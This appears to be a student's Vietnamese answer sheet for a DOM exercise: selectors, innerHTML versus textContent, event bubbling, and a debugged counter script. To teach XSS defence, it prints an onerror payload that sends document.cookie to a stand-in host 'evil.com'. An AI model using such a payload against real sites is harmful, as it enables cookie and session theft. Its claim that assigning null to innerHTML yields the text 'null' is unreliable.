PHẦN A - KIỂM TRA PHẦN ĐỌC HIỂU
Câu A1 - DOM Tree
- Sơ đồ cây DOM
document
└── div#app
    ├── header
    │   ├── h1 ("Todo App")
    │   └── nav
    │       ├── a.active ("All")
    │       ├── a ("Active")
    │       └── a ("Completed")
    └── main
        ├── form#todoForm
        │   ├── input#todoInput [type="text"]
        │   └── button ("Add")
        └── ul#todoList
            ├── li.todo-item ("Learn HTML")
            └── li.todo-item.completed ("Learn CSS")

- querySelector cho từng yêu cầu:
// 1. Chọn thẻ <h1>
document.querySelector("h1")
// hoặc: document.querySelector("#app header h1")

// 2. Chọn input trong form
document.querySelector("#todoForm input")
// hoặc: document.querySelector("#todoInput")

// 3. Chọn tất cả .todo-item
document.querySelectorAll(".todo-item")

// 4. Chọn link đang active
document.querySelector("a.active")
// hoặc: document.querySelector("nav .active")

// 5. Chọn <li> đầu tiên trong #todoList
document.querySelector("#todoList li")
// hoặc: document.querySelector("#todoList li:first-child")

// 6. Chọn tất cả <a> bên trong <nav>
document.querySelectorAll("nav a")

Câu A2 - innerHTML vs textContent
            innerHTML                                textContent
Đọc         Trả về HTML bao gồm cả tags              Chỉ trả về text thuần, bỏ tags
Ghi         Parse chuỗi thành HTML nodes             Chèn đúng nghĩa là text, không parse
Tốc độ      Chậm hơn (phải parse HTML)               Nhanh hơn
Bảo mật     ⚠️ Nguy hiểm nếu dùng với user input    ✅ An toàn

- Khi nào dùng innerHTML: Khi cần chèn HTML có cấu trúc phức tạp từ nguồn đáng tin cậy (template tĩnh, không phải user input). Ví dụ: container.innerHTML = "<ul><li>Item 1</li></ul>".
- Khi nào dùng textContent: Khi chèn text từ user input, dữ liệu bên ngoài, hoặc bất kỳ nguồn không đáng tin cậy nào.

- Lỗ hổng XSS với innerHTML
// NGUY HIỂM: User nhập <img src=x onerror="alert('Hacked!')">
const userInput = document.querySelector("#search").value;
document.querySelector("#result").innerHTML = userInput;
// → Trình duyệt parse HTML → thực thi onerror → alert chạy!
// Thực tế hacker có thể đánh cắp cookie: onerror="fetch('evil.com?c='+document.cookie)"

// CÁCH SỬA 1: Dùng textContent thay innerHTML
document.querySelector("#result").textContent = userInput;
// → userInput được hiển thị như text thuần, tags bị hiện nguyên ký tự

// CÁCH SỬA 2: Tạo text node
const textNode = document.createTextNode(userInput);
document.querySelector("#result").appendChild(textNode);

Câu A3 - Event Bubbling
- Khi click button — KHÔNG có stopPropagation:   
Output (theo thứ tự):
BUTTON   ← button bắt được trước (target)
INNER    ← bubble lên div#inner
OUTER    ← bubble lên div#outer

- Giải thích: Event bubbling là sự kiện "nổi bọt" từ phần tử được click (target) lên dần đến các phần tử cha. Thứ tự: target → cha gần nhất → cha tiếp theo → ... → document.

- Khi có e.stopPropagation():
Output:
BUTTON   ← chỉ có BUTTON, event bị chặn không bubble lên

-> stopPropagation() ngăn event tiếp tục nổi bọt lên các phần tử cha. Hữu ích khi không muốn event của con ảnh hưởng đến handler của cha.

PHẦN C - DEBUG VÀ PHÂN TÍCH
Câu C1 - Debug DOM Code
* Danh sách lỗi tìm được (7 lỗi):
- Lỗi 1 — "onclick" thay vì "click"
// SAI: "onclick" không phải tên event hợp lệ cho addEventListener
document.querySelector("#decrementBtn").addEventListener("onclick", function() { ... });

// ĐÚNG:
document.querySelector("#decrementBtn").addEventListener("click", function() { ... });

- Lỗi 2 — Gán giá trị cho countDisplay (const)
// SAI: countDisplay là DOM element (const), không thể gán = count (số)
countDisplay = count;

// ĐÚNG: cập nhật textContent
countDisplay.textContent = count;

- Lỗi 3 — historyList.innerHTML = null
// SAI: null chuyển thành chuỗi "null" — không xóa được list
historyList.innerHTML = null;

// ĐÚNG: dùng chuỗi rỗng
historyList.innerHTML = "";

- Lỗi 4 — item.remove thiếu dấu gọi hàm ()
// SAI: item.remove là tham chiếu hàm, không gọi
items.forEach(item => { item.remove; });

// ĐÚNG:
items.forEach(item => { item.remove(); });

- Lỗi 5 — Load localStorage trả về string, không phải number
// SAI: localStorage.getItem trả về string "0", "1"...
// count sẽ là string → count++ thành "11", "12"... (nối chuỗi)
count = localStorage.getItem("count");

// ĐÚNG: chuyển về number
count = parseInt(localStorage.getItem("count")) || 0;

- Lỗi 6 — Dùng innerHTML để set số đếm (bảo mật + sai ngữ nghĩa)
// SAI: count là số thuần, không cần parse HTML
countDisplay.innerHTML = count;

// ĐÚNG:
countDisplay.textContent = count;

- Lỗi 7 — Không kiểm tra null khi load localStorage
// SAI: nếu chưa có dữ liệu trong localStorage → getItem trả về null
count = parseInt(localStorage.getItem("count"));
// parseInt(null) → NaN → countDisplay hiển thị NaN

// ĐÚNG:
count = parseInt(localStorage.getItem("count")) || 0;

* Code đã sửa hoàn chỉnh:
jsconst countDisplay = document.querySelector(".count");
const historyList = document.getElementById("history");
let count = 0;

document.querySelector("#incrementBtn").addEventListener("click", function() {
    count++;
    countDisplay.textContent = count;           // Sửa lỗi 6
    const li = document.createElement("li");
    li.textContent = "Count changed to " + count;
    li.addEventListener("click", function() { deleteHistory(this); });
    historyList.append(li);
});

document.querySelector("#decrementBtn").addEventListener("click", function() {  // Sửa lỗi 1
    count--;
    countDisplay.textContent = count;           // Sửa lỗi 6
});

document.querySelector("#resetBtn").addEventListener("click", () => {
    count = 0;
    countDisplay.textContent = count;           // Sửa lỗi 2
    historyList.innerHTML = "";                 // Sửa lỗi 3
});

function deleteHistory(element) {
    element.parentNode.removeChild(element);
}

document.querySelector("#clearHistory").addEventListener("click", () => {
    const items = historyList.querySelectorAll("li");
    items.forEach(item => { item.remove(); });  // Sửa lỗi 4
});

window.addEventListener("beforeunload", () => {
    localStorage.setItem("count", count);
    localStorage.setItem("history", historyList.innerHTML);
});

window.addEventListener("load", () => {
    count = parseInt(localStorage.getItem("count")) || 0;  // Sửa lỗi 5, 7
    countDisplay.textContent = count;
});